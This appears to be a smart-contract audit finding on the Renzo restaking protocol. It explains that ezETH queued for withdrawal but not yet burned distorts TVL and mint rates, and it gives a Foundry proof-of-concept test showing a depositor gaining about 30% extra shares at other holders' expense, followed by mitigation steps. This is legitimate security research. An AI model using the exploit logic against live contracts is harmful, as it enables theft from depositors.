# Vulnerability details

## Impact
The [`RestakeManager.calculateTVLs()`](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/RestakeManager.sol#L274) function serves to calculate the protocol's TVL, which is used together with the total ezETH supply to determine the mint and redeem rates. This function iterates through all `OperatorDelegator` contracts and sums up the value of their staked collateral tokens and ETH, and adds the balance of collateral tokens held in the `WithdrawQueue` contract.

However, when a user queues a withdrawal request in [`WithdrawQueue.withdraw()`](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/Withdraw/WithdrawQueue.sol#L206), the corresponding `ezETH` amount is not immediately burned, but rather locked in the `WithdrawQueue` until the user claims the withdrawal after the cooldown period. The collateral amount to be redeemed is [calculated](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/Withdraw/WithdrawQueue.sol#L229-L232) based on the `ezETH` to collateral ratio at the time of queuing the withdrawal.

So while the `ezETH` is still included in the total supply and TVL calculation, it is essentially out of circulation as it acts as a liability that the protocol must satisfy at the predetermined rate. Including this "locked" `ezETH` in the TVL leads to inaccurate mint and redeem rates as calculated by [`RenzoOracle.calculateMintAmount()`](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/Oracle/RenzoOracle.sol#L123) and [`calculateRedeemAmount()`](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/Oracle/RenzoOracle.sol#L152) respectively.

In other words, since the "burn + remove collateral" operation is calculated immediately but executed later, it can be executed at a time when the calculation would be different, so initiated withdrawals represent a "promise of burning + removing collateral" that should be taken into account in the TVL calculation.

In the worst case, this could lead to a situation where the protocol becomes undercollateralized and unable to satisfy all withdrawal requests at the promised rates. Let's illustrate the issue an example.

## Proof of Concept
The below Foundry POC demonstrates the issue by performing the following sequence of steps:
1. Alice and Bob deposit 100 stETH and 100 cbETH respectively, receiving 100 ezETH each.
2. Alice initiates a withdrawal of 99.9999 ezETH for stETH, which gets queued.
3. Some rewards are added to the protocol, simulating a change in the underlying collateral.
4. Charlie deposits 100 cbETH before and after Alice's withdrawal is processed.
5. The test asserts that Charlie should receive the same amount of ezETH in both cases, but fails, demonstrating the inflation issue caused by the queued ezETH.

The PoC can be run in Foundry by using the setup and mock infra provided here -> https://gist.github.com/3docSec/a4bc6254f709a6218907a3de370ae84e
```solidity
pragma solidity ^0.8.19;

import "contracts/Errors/Errors.sol";
import "./Setup.sol";

contract H3 is Setup {

    function testH3() public {
        // we set the buffer to something reasonably high
        WithdrawQueueStorageV1.TokenWithdrawBuffer[] memory buffers = new WithdrawQueueStorageV1.TokenWithdrawBuffer[](2);

        buffers[0] = 
            WithdrawQueueStorageV1.TokenWithdrawBuffer(
                address(stETH),
                100e18 - 1 // bufferAmount
            );

        buffers[1] = 
            WithdrawQueueStorageV1.TokenWithdrawBuffer(
                address(cbETH),
                100e18 - 1 // bufferAmount
            );

        vm.startPrank(OWNER);
        withdrawQueue.updateWithdrawBufferTarget(buffers);

        // we'll be using stETH and cbETH with unitary price for simplicity
        stEthPriceOracle.setAnswer(1e18);
        cbEthPriceOracle.setAnswer(1e18);

        // and we start with 0 TVL
        (, , uint tvl) = restakeManager.calculateTVLs();
        assertEq(0, tvl);

        // now we have Alice depositing some stETH
        address alice = address(1234567890);
        stETH.mint(alice, 100e18);
        vm.startPrank(alice);
        stETH.approve(address(restakeManager), 100e18);
        restakeManager.deposit(IERC20(address(stETH)), 100e18);

        // and Bob deposits some cbETH
        address bob = address(1234567891);
        cbETH.mint(bob, 100e18);
        vm.startPrank(bob);
        cbETH.approve(address(restakeManager), 100e18);
        restakeManager.deposit(IERC20(address(cbETH)), 100e18);

        // ✅ TVL and balance are as expected
        (, , tvl) = restakeManager.calculateTVLs();
        assertEq(200e18, tvl);
        assertEq(100e18, ezETH.balanceOf(alice));
        assertEq(100e18, ezETH.balanceOf(bob));

        // Now Alice initiates withdrawal of her shares
        vm.startPrank(alice);
        ezETH.approve(address(withdrawQueue), 100e18 - 1);
        withdrawQueue.withdraw(100e18 - 1, address(stETH));

        // ☢️ some rewards come in, or any collateral other than
        // the queued one sees a change in price
        vm.stopPrank();
        address(depositQueue).call{value: 100 ether}("");

        vm.warp(block.timestamp + 10 days);

        // 🚨 the mint rate now is skewed, 
        // because it incorrectly factors in Alice's ezETH and collateral:
        // if one mints before Alice completes her withdrawal, they get one rate
        address charlie = address(1234567892);
        cbETH.mint(charlie, 100e18);
        vm.startPrank(charlie);
        cbETH.approve(address(restakeManager), 100e18);

        uint snapId = vm.snapshot();
        restakeManager.deposit(IERC20(address(cbETH)), 100e18);
        uint ezEthBefore = ezETH.balanceOf(charlie);

        // 🚨 while if they mint after Alice completes her withdrawal, they
        // get a different rate
        vm.revertTo(snapId);
        assertEq(0, ezETH.balanceOf(charlie));

        vm.startPrank(alice);
        withdrawQueue.claim(0);

        vm.startPrank(charlie);
        restakeManager.deposit(IERC20(address(cbETH)), 100e18);
        uint ezEthAfter = ezETH.balanceOf(charlie);

        // This fails with the following error message:
        // [FAIL. Reason: assertion failed: 66666666666666666666 != 49999999999999999925]
        assertEq(ezEthBefore, ezEthAfter);

        // Meaning that, while Alice's withdrawal was queued, Charlie received 30% more shares
        // than they would normally, effectively stealing a share of the underlying collaterals
    }
}
```

## Recommended Mitigation Steps
When processing a withdrawal request in `WithdrawQueue.withdraw()`, the `ezETH` amount should be added to a separate `withdrawQueuedEzETH` variable.

In calls to `RenzoOracle.calculateMintAmount()`/`calculateRedeemAmount()`, rather than using the full `ezETH` total supply, use the "circulating supply" by subtracting `withdrawQueuedEzETH` from it:

```solidity
uint256 ezETHTotalSupply = ezETH.totalSupply();
uint256 ezETHCirculatingSupply = ezETHTotalSupply - withdrawQueuedEzETH;
```


When a user claims their withdrawal in `WithdrawQueue.claim()`, the corresponding `ezETH` amount being burned should be subtracted from `withdrawQueuedEzETH` to reflect the updated liabilities.

Alternatively, the ezETH can simply be burned as soon as a withdrawal is queued.

As for the TVL, the `claimReserve` of each token should be subtracted from its corresponding `WithdrawQueue` balance in `RestakeManager.calculateTVLs()`.
